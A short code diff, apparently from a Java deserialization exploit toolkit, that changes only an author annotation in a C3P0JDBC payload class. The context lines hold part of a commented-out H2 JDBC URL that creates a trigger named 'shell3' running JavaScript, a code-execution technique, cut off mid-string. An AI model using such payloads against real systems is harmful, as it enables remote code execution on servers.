@@ -10,7 +10,7 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 
 @Dependencies({"com.mchange:c3p0:0.9.5.2", "com.alibaba.fastjson:com.alibaba.fastjson1.X"})
-@Authors({Authors.Unam4})
+@Authors({Authors.UNAM4})
 public class C3P0JDBC implements ObjectPayload<Object> {
     //private static  String cmd = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
     //        "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
